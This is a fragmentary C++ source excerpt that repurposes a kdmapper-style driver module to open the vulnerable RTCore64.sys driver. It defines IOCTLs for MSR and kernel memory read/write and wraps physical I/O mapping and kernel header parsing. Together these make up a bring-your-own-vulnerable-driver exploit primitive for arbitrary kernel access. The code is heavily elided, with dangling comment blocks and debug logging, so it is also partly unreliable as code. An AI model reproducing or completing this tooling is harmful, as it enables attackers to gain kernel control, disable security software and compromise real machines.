...
#define KM_IOCTL_MSRREAD		0x80002030
#define KM_IOCTL_MSRWRITE		0x80002034
#define KM_IOCTL_MAPIOSPACE	0x80002040
#define KM_IOCTL_UNMAPIOSPACE	0x80002044
#define KM_IOCTL_MEMREAD		0x80002048
#define KM_IOCTL_MEMWRITE		0x8000204C
...
bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"RTCore64.sys",
...
HANDLE intel_driver::Load() {
	...
	/**if (intel_driver::IsRunning()) {
		Log(L"[-] RTCore64 is already in use." << std::endl);
...
/**	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	intel_driver::driver_name = "VulnerableDriver";
	...
	*/
	...
	HANDLE result = CreateFileW(L"RTCore64.sys", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	...
	else if (result != INVALID_HANDLE_VALUE)
	{
		Log("[*] load success\n");
	}
...
uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	...
	if (!DeviceIoControl(device_handle, KM_IOCTL_MAPIOSPACE, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;
...
bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	...
	return DeviceIoControl(device_handle, KM_IOCTL_UNMAPIOSPACE, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}
...
uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	Log("lll "<< modulePtr << std::endl);
	if (!ReadMemory(device_handle, modulePtr, headers, (uint64_t)size)) {
	...
	if (size)
		*size = sectionSize;
	auto const testing = section - (uintptr_t)headers + modulePtr;
	Log("testing " << testing);
	return testing;
}
